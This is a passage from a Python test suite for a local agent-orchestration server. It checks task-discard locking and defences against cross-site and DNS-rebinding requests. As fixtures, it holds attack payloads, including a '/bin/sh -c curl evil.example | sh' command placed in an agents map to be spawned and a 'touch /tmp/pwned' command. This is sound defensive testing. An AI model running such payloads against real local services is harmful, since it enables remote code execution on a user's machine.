                     f"worktree {wt10}\nHEAD ccc\nbranch refs/heads/task/task-10\n\n")
        answer = self._discard_run_git([], porcelain)

        calls = []  # every git call from every request, in order
        first_is_tagging = threading.Event()
        let_the_first_finish = threading.Event()

        def fake_run_git(args, cwd=None):
            calls.append(tuple(args))
            if args[:1] == ["tag"] and args[1].startswith("abandoned/task-9-"):
                # Parked mid-discard, holding TASK-9's lifecycle lock:
                # the tag is written and neither removal has happened.
                first_is_tagging.set()
                let_the_first_finish.wait(10)
            return answer(args, cwd=cwd)

        def tags(seq):
            """Positions of every recovery tag written for task-9."""
            return [i for i, c in enumerate(seq)
                    if c[0] == "tag" and c[1].startswith("abandoned/task-9-")]

        def deletes(seq):
            """Positions of every delete of task/task-9."""
            return [i for i, c in enumerate(seq)
                    if c[:3] == ("update-ref", "-d", "refs/heads/task/task-9")]

        results = {}

        def discard(label, task_id):
            def run():
                results[label] = self._post_json("/api/discard-attempt", dict(
                    {"project": "my-app", "taskId": task_id}, **self._reviewed_state()))
            thread = threading.Thread(target=run, name=label, daemon=True)
            thread.start()
            return thread

        def no_backlog(args, cwd):
            raise AssertionError(f"the backlog CLI must not be consulted: {args}")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=no_backlog), \
             mock.patch("os.path.isdir",
                        side_effect=lambda p: p in (self.my_app_dir, wt9, wt10)):
            first = discard("first-task-9", "TASK-9")
            self.assertTrue(first_is_tagging.wait(10), "the first discard never reached its tag")
            self.assertTrue(server.task_lifecycle_lock("my-app", "TASK-9").locked())
            self.assertFalse(server.task_lifecycle_lock("my-app", "TASK-10").locked())

            second = discard("second-task-9", "TASK-9")
            time.sleep(0.25)
            blocked = list(calls)
            self.assertEqual(len(tags(blocked)), 1,
                             "a second discard of the same task tagged while the first held it")
            self.assertEqual(deletes(blocked), [],
                             "nothing may delete task/task-9 while the first discard holds it")

            unrelated = discard("task-10", "TASK-10")
            unrelated.join(timeout=10)
            self.assertFalse(unrelated.is_alive(),
                             "a lifecycle request for an unrelated task must not wait")
            self.assertEqual(results["task-10"][0], 200, results["task-10"][1])
            # It really did run to completion inside the first's window.
            self.assertIn(("update-ref", "-d", "refs/heads/task/task-10", self.TIP_SHA), calls)
            self.assertEqual(deletes(calls), [])

            let_the_first_finish.set()
            first.join(timeout=10)
            second.join(timeout=10)

        self.assertEqual(results["first-task-9"][0], 200, results["first-task-9"][1])
        self.assertEqual(results["second-task-9"][0], 200, results["second-task-9"][1])

        # Both ran, one after the other: the second discard's tag was not
        # written until the first had finished deleting the branch.
        self.assertEqual(len(tags(calls)), 2)
        self.assertEqual(len(deletes(calls)), 2)
        self.assertLess(deletes(calls)[0], tags(calls)[1])

    def test_get_discard_preview_reports_the_real_counts_and_destroys_nothing(self):
        # AC #4's source: this is where the confirming click's "3 commits
        # and 4 uncommitted files" comes from, measured now rather than
        # read off a board field that is a refresh interval old.
        git_calls = []
        wt_dir, patches = self._throwaway_env(git_calls)
        with patches[0], patches[1], patches[2], patches[3]:
            status, body = self._get("/api/discard-preview?project=my-app&task=TASK-9")

        self.assertEqual(status, 200, body)
        self.assertEqual(body["branch"], "task/task-9")
        self.assertTrue(body["branchExists"])
        self.assertEqual(body["branchTip"], self.TIP_SHA)
        self.assertEqual(body["commitCount"], 3)
        self.assertEqual(body["baseBranch"], "main")
        self.assertTrue(body["worktreeExists"])
        self.assertEqual(body["worktreePath"], wt_dir)
        self.assertEqual(body["dirtyFileCount"], 3)
        self.assertEqual(body["dirtyPaths"], self.DISCARD_DIRTY_PATHS)
        self.assertIsNone(body["liveSession"])
        self.assertIsNone(body["externalCheckout"])
        self.assertEqual(body["recoveryCommand"], f"git branch task/task-9 {self.TIP_SHA}")

        # Read-only, in full: no tag, no removal, no branch delete.
        for verb in ("tag", "branch"):
            self.assertNotIn(verb, [c[0] for c in git_calls])
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])

    def test_get_discard_preview_reports_an_unmeasurable_count_as_null_never_as_zero(self):
        git_calls = []
        _, patches = self._throwaway_env(git_calls, commit_count=None, status_rc=1)
        with patches[0], patches[1], patches[2], patches[3]:
            status, body = self._get("/api/discard-preview?project=my-app&task=TASK-9")
        self.assertEqual(status, 200, body)
        self.assertIsNone(body["commitCount"])
        self.assertIsNone(body["dirtyFileCount"])
        self.assertIsNone(body["dirtyPaths"])

    def test_get_discard_preview_names_the_refusals_instead_of_making_them(self):
        # The preview's job is to describe, so a live session and a
        # foreign checkout are reported as fields rather than as a 409:
        # the UI needs to say WHY an action is unavailable, and a bare
        # error status cannot carry both facts at once.
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")
        git_calls = []
        with mock.patch.object(server, "run_tmux",
                               side_effect=self._live_session_run_tmux("centrale-my-app-task-9")), \
             mock.patch.object(server, "run_git",
                               side_effect=self._discard_run_git(git_calls, self._worktree_porcelain(wt_dir))), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._get("/api/discard-preview?project=my-app&task=TASK-9")
        self.assertEqual(status, 200, body)
        self.assertEqual(body["liveSession"], "centrale-my-app-task-9")

        import spawn
        foreign = os.path.join(self.my_app_dir, ".worktrees", "someone-elses-checkout")
        git_calls = []
        _, patches = self._throwaway_env(git_calls, porcelain=self._worktree_porcelain(foreign))
        with patches[0], patches[1], patches[2], patches[3]:
            status, body = self._get("/api/discard-preview?project=my-app&task=TASK-9")
        self.assertEqual(status, 200, body)
        self.assertEqual(body["externalCheckout"]["path"], foreign)
        self.assertEqual(body["externalCheckout"]["reason"],
                         spawn.external_checkout_reason("task/task-9", foreign))

    def test_throwaway_routes_validate_identity_exactly_like_every_other_endpoint(self):
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            with self.subTest(path=path):
                status, body = self._post_json(path, {"taskId": "TASK-9"})
                self.assertEqual(status, 400)
                status, body = self._post_json(path, {"project": "nope", "taskId": "TASK-9"})
                self.assertEqual(status, 404)
                status, body = self._post_json(path, {"project": "my-app", "taskId": "not-a-task"})
                self.assertEqual(status, 400)
        status, body = self._get("/api/discard-preview?task=TASK-9")
        self.assertEqual(status, 400)
        status, body = self._get("/api/discard-preview?project=my-app")
        self.assertEqual(status, 400)

    # -- task-99: no web page may drive Centrale ---------------------------
    #
    # The two attack shapes the task names, plus the header rules that
    # refuse them. Every assertion here is about a request that could NOT
    # have come from Centrale's own UI.

    POST_ROUTES = [
        "/api/spawn", "/api/resume", "/api/browser", "/api/harvest",
        "/api/settings", "/api/agent-event", "/api/end-session",
        "/api/session-input", "/api/cleanup-branch",
        "/api/discard-attempt", "/api/abandon-worktree",
    ]

    def _no_subprocesses(self):
        """Patch every subprocess boundary to explode. A refused request
        must be refused before any of them runs -- a 4xx that already
        spawned an agent or killed a session is not a refusal."""
        boom = AssertionError("a refused request must not reach a subprocess")
        return [
            mock.patch.object(server, name, side_effect=boom)
            for name in ("run_git", "run_tmux", "run_backlog", "run_backlog_raw")
        ]

    def _refused(self, path, body_bytes=b"{}", headers=None):
        with contextlib.ExitStack() as stack:
            for patcher in self._no_subprocesses():
                stack.enter_context(patcher)
            return self._post(path, body_bytes, headers=headers)

    def test_text_plain_body_that_parses_as_json_is_refused(self):
        # Attack shape 1: <form enctype="text/plain"> delivers a body
        # json.loads() parses happily -- a simple request, no CORS
        # preflight, no server opt-in. The content type alone refuses it.
        payload = json.dumps({
            "agents": {"pwn": {"cmd": ["/bin/sh", "-c", "touch /tmp/pwned"]}},
        }).encode("utf-8")
        for path in self.POST_ROUTES:
            with self.subTest(path=path):
                status, body = self._refused(
                    path, payload, headers={"Content-Type": "text/plain"}
                )
                self.assertEqual(status, 415)
                self.assertIn("application/json", body["error"])
                self.assertIn("text/plain", body["error"])

    def test_bodyless_post_carrying_identity_in_the_query_string_is_refused(self):
        # Attack shape 2: a bare cross-origin form POST, no body at all,
        # with everything the handler needs in the URL. Nothing may
        # reach a handler fully populated this way.
        cases = [
            "/api/cleanup-branch?project=my-app&taskId=TASK-9",
            "/api/cleanup-branch?project=my-app&task=TASK-9",
            "/api/end-session?project=my-app&task=TASK-9",
            "/api/session-input?project=my-app&task=TASK-9",
            "/api/agent-event?project=my-app&task=TASK-9&state=finished",
        ]
        for path in cases:
            with self.subTest(path=path):
                # Even with the content type a form cannot actually set,
                # the query string no longer carries anything.
                status, body = self._refused(path, b"")
                self.assertEqual(status, 400)
                self.assertIn("error", body)
                # And as a real form would send it: refused earlier still.
                status, body = self._refused(
                    path, b"", headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                self.assertEqual(status, 415)

    def test_form_content_types_are_all_refused(self):
        for ctype in ("text/plain", "text/plain;charset=UTF-8",
                      "application/x-www-form-urlencoded",
                      "multipart/form-data; boundary=----x"):
            with self.subTest(ctype=ctype):
                status, body = self._refused(
                    "/api/spawn", b"{}", headers={"Content-Type": ctype}
                )
                self.assertEqual(status, 415)
                self.assertIn("docs/api.md", body["error"])

    def test_missing_content_type_is_refused(self):
        # An omitted header is not an application/json declaration.
        # Sent through http.client because urllib.request silently adds
        # application/x-www-form-urlencoded to any request with a body --
        # the header genuinely has to be absent here.
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        self.addCleanup(conn.close)
        conn.request("POST", "/api/spawn", body=b"{}")
        resp = conn.getresponse()
        self.assertEqual(resp.status, 415)
        body = json.loads(resp.read().decode("utf-8"))
        self.assertIn("no Content-Type header", body["error"])

    def test_json_content_type_with_parameters_is_accepted(self):
        # The parameters after the media type are not the server's
        # business -- a browser's fetch() may add a charset.
        status, _ = self._post(
            "/api/agent-event?project=my-app&task=TASK-2",
            json.dumps({"state": "working"}).encode("utf-8"),
            headers={"Content-Type": "Application/JSON; charset=utf-8"},
        )
        self.assertEqual(status, 200)

    def test_foreign_origin_is_refused_on_every_post_route(self):
        for path in self.POST_ROUTES:
            with self.subTest(path=path):
                status, body = self._refused(path, b"{}", headers={
                    "Content-Type": "application/json",
                    "Origin": "https://evil.example",
                })
                self.assertEqual(status, 403)
                self.assertIn("cross-site", body["error"])
                self.assertIn("https://evil.example", body["error"])

    def test_foreign_referer_is_refused_when_no_origin_is_sent(self):
        status, body = self._refused("/api/spawn", b"{}", headers={
            "Content-Type": "application/json",
            "Referer": "https://evil.example/some/page?q=1",
        })
        self.assertEqual(status, 403)
        self.assertIn("cross-site", body["error"])

    def test_origin_wins_over_referer(self):
        # A page cannot launder a foreign Origin behind a friendly
        # Referer: Origin is checked first and is decisive.
        status, _ = self._refused("/api/spawn", b"{}", headers={
            "Content-Type": "application/json",
            "Origin": "https://evil.example",
            "Referer": f"http://127.0.0.1:{self.port}/",
        })
        self.assertEqual(status, 403)

    def test_null_and_malformed_origins_are_refused(self):
        # "null" is what a sandboxed iframe or a file:// page sends. It
        # is an origin, and it is never ours.
        for origin in ("null", "", "not a url", "file://", "http://",
                       "https://127.0.0.1", "http://127.0.0.1"):
            with self.subTest(origin=origin):
                status, _ = self._refused("/api/spawn", b"{}", headers={
                    "Content-Type": "application/json",
                    "Origin": origin,
                })
                self.assertEqual(status, 403)

    def test_a_same_port_origin_on_another_host_is_refused(self):
        # The port alone is not the check -- DNS rebinding lands on
        # 127.0.0.1 under an attacker's own hostname.
        status, _ = self._refused("/api/spawn", b"{}", headers={
            "Content-Type": "application/json",
            "Origin": f"http://rebind.example:{self.port}",
        })
        self.assertEqual(status, 403)

    def test_own_origins_are_accepted(self):
        for origin in (f"http://127.0.0.1:{self.port}",
                       f"http://localhost:{self.port}",
                       f"http://[::1]:{self.port}"):
            with self.subTest(origin=origin):
                status, _ = self._post(
                    "/api/agent-event?project=my-app&task=TASK-2",
                    json.dumps({"state": "working"}).encode("utf-8"),
                    headers={"Content-Type": "application/json", "Origin": origin},
                )
                self.assertEqual(status, 200)

    def test_own_origin_as_a_referer_is_accepted(self):
        status, _ = self._post(
            "/api/agent-event?project=my-app&task=TASK-2",
            json.dumps({"state": "working"}).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Referer": f"http://127.0.0.1:{self.port}/static/index.html",
            },
        )
        self.assertEqual(status, 200)

    def test_a_request_with_neither_header_is_accepted(self):
        # curl, a script, and centrale_notify.py send neither. A web page
        # cannot suppress Origin, so refusing these would break every
        # non-browser caller and buy nothing.
        status, _ = self._post(
            "/api/agent-event?project=my-app&task=TASK-2",
            json.dumps({"state": "working"}).encode("utf-8"),
        )
        self.assertEqual(status, 200)

    def test_a_foreign_origin_is_refused_on_get_routes_too(self):
        # task-122 reversed task-99's carve-out here. "Reads are not
        # state changes" was wrong twice over: GET /api/harvest runs the
        # merge gate (scratch worktree, real merge, the project's own
        # checkCommand) and GET /api/session-pane arms
        # POST /api/session-input -- and "a cross-origin page cannot read
        # the response anyway" stops being true the moment the page is
        # rebound onto 127.0.0.1 and counts as same-origin.
        status, body = self._raw(
            "GET", "/api/board", {"Origin": "https://evil.example"}
        )
        self.assertEqual(status, 403)
        self.assertIn("cross-site", json.loads(body)["error"])
        self.assertNotIn(b"my-app", body)

    def test_no_cors_headers_are_ever_sent(self):
        # The Content-Type rule only holds because a preflight goes
        # unanswered: nothing here may opt in to cross-origin access.
        with urllib.request.urlopen(self._url("/api/board"), timeout=5) as resp:
            for header in ("Access-Control-Allow-Origin",
                           "Access-Control-Allow-Methods",
                           "Access-Control-Allow-Headers",
                           "Access-Control-Allow-Credentials"):
                self.assertIsNone(resp.headers.get(header), header)

    def test_the_settings_then_spawn_escalation_is_refused_at_step_one(self):
        # The reason this is a release blocker rather than hardening:
        # POST /api/settings writes the agents map (name -> argv) and
        # POST /api/spawn executes it. Both halves are refused, and
        # projects.json is never opened.
        write_agents = json.dumps({
            "agents": {"pwn": {"cmd": ["/bin/sh", "-c", "curl evil.example | sh"]}},
        }).encode("utf-8")
        for headers in ({"Content-Type": "text/plain"},
                        {"Content-Type": "application/json", "Origin": "https://evil.example"}):
            with self.subTest(headers=headers):
                with mock.patch("builtins.open", side_effect=AssertionError("no config write")):
                    status, _ = self._post("/api/settings", write_agents, headers=headers)
                self.assertIn(status, (403, 415))
                status, _ = self._post(
                    "/api/spawn",
                    json.dumps({"project": "my-app", "taskId": "TASK-9"}).encode("utf-8"),
                    headers=headers,
                )
                self.assertIn(status, (403, 415))

    # -- task-122: DNS rebinding, and cross-site GET ------------------------
    #
    # task-99 guarded POST only, and even there allowed a request that
    # sent neither Origin nor Referer -- exactly what a DNS-rebound page
    # produces. These reproduce both halves: a page served from a
    # hostname the attacker pointed at 127.0.0.1 (same-origin as far as
    # the browser is concerned, so CORS protects nothing), and a plain
    # cross-site resource request aimed straight at the loopback address.

    GET_ROUTES = [
        "/",
        "/static/styles.css",
        "/favicon.ico",
        "/api/board",
        "/api/task?project=my-app&id=TASK-2",
        "/api/sessions",
        "/api/session-pane?project=my-app&task=TASK-2",
        "/api/harvest?project=my-app",
        "/api/harvest-progress",
        "/api/discard-preview?project=my-app&task=TASK-9",
        "/api/settings",
    ]

    def _rebound_headers(self, extra=None):
        """What a browser actually sends for a fetch from a page served
        by http://rebind.example:<port> once rebind.example resolves to
        127.0.0.1. Measured, not assumed: driven through Chromium with
        --host-resolver-rules="MAP rebind.example 127.0.0.1" while
        recording the headers the server received.

        No Origin (a same-origin GET sends none), no Sec-Fetch-* AT ALL,
        and a Host naming the attacker's own hostname. The missing fetch
        metadata is the part worth knowing: those headers are only
        appended for a potentially-trustworthy URL, and after rebinding
        the page's own origin is plain http://rebind.example -- which is
        not one. So Sec-Fetch-Site cannot catch this shape; it looks
        exactly like curl apart from the Host. Nothing but the Host
        allowlist stands here."""
        headers = {"Host": f"rebind.example:{self.port}"}
        headers.update(extra or {})
        return headers

    def _cross_site_headers(self, extra=None):
        """What a browser sends for a direct cross-site resource request
        -- <img src="http://127.0.0.1:<port>/api/harvest?project=...">
        from evil.example, under <meta name="referrer"
        content="no-referrer">. The Host is genuinely ours and there is
        no Origin and no Referer to catch it by; Sec-Fetch-Site is the
        only thing that gives it away, and the page cannot touch it."""
        headers = {
            "Host": f"127.0.0.1:{self.port}",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Dest": "image",
        }
        headers.update(extra or {})
        return headers

    def _no_boundaries(self):
        """Patch every boundary AC #4 names -- git, tmux, backlog, the
        checkCommand, the temporary worktree harvest cuts, and the
        pane-capture bookkeeping that arms POST /api/session-input -- to
        explode. A 403 that already ran the project's test suite is not
        a refusal."""
        boom = AssertionError("a refused request must not reach a boundary")
        patchers = [
            mock.patch.object(server, name, side_effect=boom)
            for name in ("run_git", "run_tmux", "run_backlog", "run_backlog_raw",
                         "run_check_command", "list_sessions",
                         "record_pane_capture")
        ]
        patchers.append(mock.patch("tempfile.mkdtemp", side_effect=boom))
        return patchers

    @contextlib.contextmanager
    def _boundaries_refused(self):
        with contextlib.ExitStack() as stack:
            for patcher in self._no_boundaries():
                stack.enter_context(patcher)
            yield

    # -- the Host allowlist -------------------------------------------

    def test_a_rebound_host_cannot_read_any_get_route(self):
        # AC #1 and #5: same-origin browser semantics, an attacker's
        # hostname in Host. Nothing is served -- not an API response,
        # not a static file.
        for path in self.GET_ROUTES:
            with self.subTest(path=path):
                with self._boundaries_refused():
                    status, body = self._raw("GET", path, self._rebound_headers())
                self.assertEqual(status, 403)
                self.assertIn("rebind.example", json.loads(body)["error"])
                self.assertNotIn(b"my-app", body)
                self.assertNotIn(b"<html", body.lower())

    def test_the_host_gate_refuses_before_the_origin_gate_does(self):
        # A rebound page's cors fetch sends Origin: http://rebind.example
        # -- which, to the browser, IS the request's own origin, and
        # which task-99's Origin rule would also have refused. The Host
        # gate has to be the one that fires, because the same page's
        # SAME-origin fetches (the shape it would actually use) carry no
        # Origin at all: the error must name the host, not the origin.
        origin = f"http://rebind.example:{self.port}"
        with self._boundaries_refused():
            status, body = self._raw(
                "GET", "/api/board",
                self._rebound_headers({
                    "Origin": origin,
                    "Referer": origin + "/",
                    "Sec-Fetch-Site": "same-origin",
                }),
            )
        self.assertEqual(status, 403)
        self.assertIn("does not serve", json.loads(body)["error"])
        self.assertNotIn(b"my-app", body)

    def test_the_host_gate_holds_with_or_without_fetch_metadata(self):
        # The measured shape carries no Sec-Fetch-* (see
        # _rebound_headers): a rebound page's origin is plain http and so
        # not potentially trustworthy, and the browser appends none. A
        # rebind onto an https origin would send "same-origin". Both are
        # refused, and by the Host rule in both cases -- which is why
        # rule 2 cannot stand in for rule 1.
        for extra in ({}, {"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors"}):
            with self.subTest(extra=extra):
                with self._boundaries_refused():
                    status, body = self._raw(
                        "GET", "/api/settings", self._rebound_headers(extra)
                    )
                self.assertEqual(status, 403)
                self.assertIn("does not serve", json.loads(body)["error"])

    def test_loopback_hosts_at_the_bound_port_are_accepted(self):
        # AC #2: the names on the allowlist, at the port the socket
        # actually bound, keep working.
        for host in (f"127.0.0.1:{self.port}", f"localhost:{self.port}",
                     f"[::1]:{self.port}"):
            with self.subTest(host=host):
                status, _ = self._raw("GET", "/api/harvest-progress", {"Host": host})
                self.assertEqual(status, 200)

    def test_a_loopback_host_at_the_wrong_port_is_refused(self):
        # AC #2, the other half: the port comes from the listening
        # socket, never from the header, so the header cannot vouch for
        # itself. (Port 1 is never this test server's ephemeral port.)
        with self._boundaries_refused():
            status, _ = self._raw("GET", "/api/board", {"Host": "127.0.0.1:1"})
        self.assertEqual(status, 403)

    def test_a_missing_host_header_is_refused(self):
        # HTTP/1.1 requires Host; anything that omits it is not a client
        # we can place, and there is nothing to check it against.
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        self.addCleanup(conn.close)
        conn.putrequest("GET", "/api/board", skip_host=True, skip_accept_encoding=True)
        conn.endheaders()
        resp = conn.getresponse()
        self.assertEqual(resp.status, 403)
        self.assertIn("no Host header", json.loads(resp.read())["error"])

    def test_host_allowlist_helpers(self):
        # The parsing the gate rests on, in isolation.
        self.assertEqual(server.request_host("127.0.0.1:7420"), ("127.0.0.1", 7420))
        self.assertEqual(server.request_host("[::1]:7420"), ("::1", 7420))
        self.assertEqual(server.request_host("LocalHost:7420"), ("localhost", 7420))
        # No port means http's default, not "any port".
        self.assertEqual(server.request_host("127.0.0.1"), ("127.0.0.1", 80))
        for junk in (None, "", "   ", "127.0.0.1:notaport", "127.0.0.1:99999",
                     "evil.example@127.0.0.1:7420"):
            with self.subTest(junk=junk):
                self.assertIsNone(server.request_host(junk))

        self.assertTrue(server.host_is_own("localhost:7420", 7420))
        self.assertTrue(server.host_is_own("127.0.0.1", 80))
        for host in ("rebind.example:7420", "127.0.0.1:7421", "127.0.0.1",
                     "0.0.0.0:7420", "127.0.0.2:7420", None):
            with self.subTest(host=host):
                self.assertFalse(server.host_is_own(host, 7420))

    # -- the Sec-Fetch-Site rule --------------------------------------

    def test_a_direct_cross_site_get_is_refused_on_every_route(self):
        # AC #3 and #5: a real Host, no Origin, no Referer -- the shape
        # an <img>/<script>/<iframe> under a no-referrer policy produces.
        for path in self.GET_ROUTES:
            with self.subTest(path=path):
                with self._boundaries_refused():
                    status, body = self._raw("GET", path, self._cross_site_headers())
                self.assertEqual(status, 403)
                self.assertIn("cross-site", json.loads(body)["error"])
                self.assertNotIn(b"my-app", body)

    def test_a_same_site_fetch_is_refused(self):
        # Another local server on localhost:<other port> is same-site
        # with localhost:<ours> but is not Centrale's UI.
        with self._boundaries_refused():
            status, _ = self._raw(
                "GET", "/api/board",
                self._cross_site_headers({"Sec-Fetch-Site": "same-site"}),
            )
        self.assertEqual(status, 403)

    def test_user_initiated_navigation_and_the_own_ui_are_accepted(self):
        # "none" is the address bar or a bookmark; "same-origin" is
        # Centrale's own page fetching its own API.
        for site in ("none", "same-origin", "Same-Origin"):
            with self.subTest(site=site):
                status, _ = self._raw(
                    "GET", "/api/harvest-progress",
                    {"Host": f"127.0.0.1:{self.port}", "Sec-Fetch-Site": site},
                )
                self.assertEqual(status, 200)

    def test_non_browser_clients_keep_working(self):
        # AC #6: curl, a script and centrale_notify.py send no
        # Sec-Fetch-Site at all and a loopback Host of their own accord.
        # Nothing here asks them to change.
        status, body = self._raw("GET", "/api/settings", {"Host": f"localhost:{self.port}"})
        self.assertEqual(status, 200)
        self.assertIn("agents", json.loads(body))
        status, _ = self._get("/api/harvest-progress")
        self.assertEqual(status, 200)
        status, _ = self._post(
            "/api/agent-event?project=my-app&task=TASK-2",
            json.dumps({"state": "working"}).encode("utf-8"),
        )
        self.assertEqual(status, 200)

    # -- nothing runs behind a refusal --------------------------------

    def test_a_refused_get_reaches_no_boundary(self):
        # AC #4. /api/harvest is the one that matters most: it runs the
        # whole merge gate per branch -- scratch worktree, real merge,
        # the project's own checkCommand. /api/session-pane is the other:
        # a capture arms POST /api/session-input for that session.
        side_effect_routes = [
            "/api/harvest?project=my-app",
            "/api/board?force=1",
            "/api/session-pane?project=my-app&task=TASK-2",
            "/api/discard-preview?project=my-app&task=TASK-9",
            "/api/sessions",
            "/api/task?project=my-app&id=TASK-2",
        ]
        for headers in (self._rebound_headers(), self._cross_site_headers()):
            for path in side_effect_routes:
                with self.subTest(path=path, host=headers["Host"]):
                    with self._boundaries_refused():
                        status, _ = self._raw("GET", path, headers)
                    self.assertEqual(status, 403)
        # And the capture bookkeeping was never armed for the session
        # /api/session-pane names.
        self.assertEqual(server._pane_capture_times, {})

    def test_a_rebound_post_sending_neither_origin_nor_referer_is_refused(self):
        # The gap task-122 was filed for: this exact request used to
        # reach the handler (a 404 from /api/end-session, not a 403 from
        # the gate) because task-99 deliberately allowed a POST carrying
        # neither header. AC #8.
        for path in self.POST_ROUTES:
            with self.subTest(path=path):
                with self._boundaries_refused():
                    status, body = self._raw(
                        "POST", path,
                        self._rebound_headers({"Content-Type": "application/json"}),
                        body=b"{}",
                    )
                self.assertEqual(status, 403)
                self.assertIn("rebind.example", json.loads(body)["error"])

    def test_the_settings_then_spawn_chain_is_refused_under_a_rebound_host(self):
        # AC #9. The full escalation task-99 closed for ordinary
        # cross-site requests and task-122 closes for rebound ones:
        # POST /api/settings writes the agents map (name -> argv),
        # POST /api/spawn executes it. Both are refused before
        # projects.json is opened and before any agent argv is resolved.
        import spawn as spawn_module

        write_agents = json.dumps({
            "agents": {"pwn": {"cmd": ["/bin/sh", "-c", "curl evil.example | sh"]}},
        }).encode("utf-8")
        headers = self._rebound_headers({"Content-Type": "application/json"})

        with contextlib.ExitStack() as stack:
            for patcher in self._no_boundaries():
                stack.enter_context(patcher)
            stack.enter_context(mock.patch("builtins.open",
                                           side_effect=AssertionError("no config write")))
            stack.enter_context(mock.patch.object(
                spawn_module, "resolve_agent",
                side_effect=AssertionError("no agent argv may be resolved")))
            stack.enter_context(mock.patch.object(
                spawn_module, "spawn",
                side_effect=AssertionError("no spawn may be attempted")))
            status, _ = self._raw("POST", "/api/settings", headers, body=write_agents)
            self.assertEqual(status, 403)
            status, _ = self._raw(
                "POST", "/api/spawn", headers,
                body=json.dumps({"project": "my-app", "taskId": "TASK-9"}).encode("utf-8"),
            )
            self.assertEqual(status, 403)

        # And the agents map is untouched: the read the rebound page was
        # trying to poison still shows the configured agents.
        status, body = self._get("/api/settings")
        self.assertEqual(status, 200)
        self.assertNotIn("pwn", body["agents"])


class StaticSplitContractTests(unittest.TestCase):
    """Task-82/83/89: the CSS lives in static/styles.css and the JS in the
    per-concern files listed in FRONTEND_FILES, each loaded by one plain
    tag from index.html -- no <style> block, no main <script> block, no
    build step, no external asset beyond those and the tab icon (task-90,
    covered by FaviconContractTests). Hermetic source-level checks like
    the classes below."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")
        cls.files = {name: load_static(name) for name in FRONTEND_FILES}

    def test_index_html_has_no_style_block(self):
        self.assertNotIn("<style", self.html)
        self.assertNotIn("</style>", self.html)

    def test_index_html_links_styles_css_once_from_the_head(self):
        self.assertEqual(self.html.count(STYLESHEET_LINK), 1)
        # The only two linked assets: the stylesheet and the tab icon.
        self.assertEqual(self.html.count("<link"), 2)
        self.assertLess(self.html.index(STYLESHEET_LINK), self.html.index("</head>"))
        # The pre-paint theme script still precedes the stylesheet, so an
        # explicit choice is on <html> before the first styled paint.
        self.assertLess(self.html.index("window.CentraleTheme = {"), self.html.index(STYLESHEET_LINK))

    def test_styles_css_carries_the_palette_and_theme_rules(self):
        self.assertTrue(self.css.strip())
        self.assertIn(":root {", self.css)
        self.assertIn("@media (prefers-color-scheme: dark)", self.css)
        self.assertIn('[data-theme="dark"]', self.css)

    def test_index_html_has_no_main_script_block(self):
        # One script element per frontend file plus the inline pre-paint
        # theme bootstrap (whose position in <head> is load-bearing).
        # Only one bare "<script>" opener is left, so a second inline
        # block would show up here.
        self.assertEqual(self.html.count("<script"), len(FRONTEND_FILES) + 1)
        self.assertEqual(self.html.count("<script>"), 1)
        # Nothing of the application code is left behind in the shell.
        for marker in ("function renderCard(", "function openDrawer(", "C.boardData ="):
            self.assertNotIn(marker, self.html, marker)

    def test_index_html_loads_every_frontend_file_once_in_a_fixed_order(self):
        # One contiguous block of tags, in exactly the documented order:
        # a reordering or a duplicate tag fails here.
        self.assertIn(SCRIPT_TAGS, self.html)
        self.assertEqual(self.html.count("<script src="), len(FRONTEND_FILES))
        for name in FRONTEND_FILES:
            self.assertEqual(self.html.count('/static/%s"' % name), 1, name)
        # state.js first (it holds the shared state every other file
        # reads) and main.js last (it fires the first refresh).
        self.assertLess(self.html.index("/static/state.js"), self.html.index("/static/dom.js"))
        self.assertEqual(
            max(self.html.index("/static/%s" % n) for n in FRONTEND_FILES),
            self.html.index("/static/main.js"),
        )

    def test_frontend_files_load_from_the_end_of_the_body(self):
        # Same position the inline block held: after all the markup they
        # query on load, so no defer/async is needed to keep them working.
        self.assertLess(self.html.index('<div id="toast-container">'), self.html.index(SCRIPT_TAGS))
        self.assertLess(self.html.index(SCRIPT_TAGS), self.html.index("</body>"))
        # A comment above each script says why it sits where it does.
        head_script = self.html[:self.html.index("<script>")]
        self.assertIn("load-bearing", head_script)
        self.assertIn("load-bearing", self.html[self.html.index('<div id="toast-container">'):])

    def test_theme_bootstrap_stays_inline_and_out_of_the_frontend_files(self):
        # It has to run before the first styled paint; an end-of-body
        # external file cannot, so this one function stays in <head>.
        self.assertIn("window.CentraleTheme = {", self.html)
        self.assertLess(self.html.index("window.CentraleTheme = {"), self.html.index("</head>"))
        for name, js in self.files.items():
            self.assertNotIn("window.CentraleTheme = {", js, name)
        # The frontend is the consumer of that bootstrap, not its owner.
        self.assertIn("window.CentraleTheme", self.files["shell.js"])

    def test_every_frontend_file_is_one_iife_over_the_shared_namespace(self):
        for name in FRONTEND_FILES:
            with self.subTest(name):
                js = self.files[name]
                # A header naming the file and its concern, then the wrapper.
                self.assertTrue(js.startswith("// static/%s -- " % name), js[:40])
                self.assertEqual(js.count(IIFE_OPEN), 1)
                self.assertEqual(js.count(IIFE_CLOSE), 1)
                self.assertTrue(js.rstrip().endswith(IIFE_CLOSE))
                # No markup or style leaked into a script file.
                self.assertNotIn("<script", js)
                self.assertNotIn("<!DOCTYPE", js)

    def test_static_dir_holds_no_frontend_file_index_html_does_not_load(self):
        # The split replaced app.js: an orphan file (or a leftover one)
        # would be dead code no browser ever runs.
        on_disk = sorted(
            n for n in os.listdir(STATIC_DIR) if n.endswith(".js")
        )
        self.assertEqual(on_disk, sorted(FRONTEND_FILES))
        self.assertNotIn("app.js", on_disk)

    def test_the_seam_is_one_namespace_object_with_no_name_published_twice(self):
        # Rule 2 of the seam (see static/state.js): a shared function or
        # constant is declared normally and published at the end of its
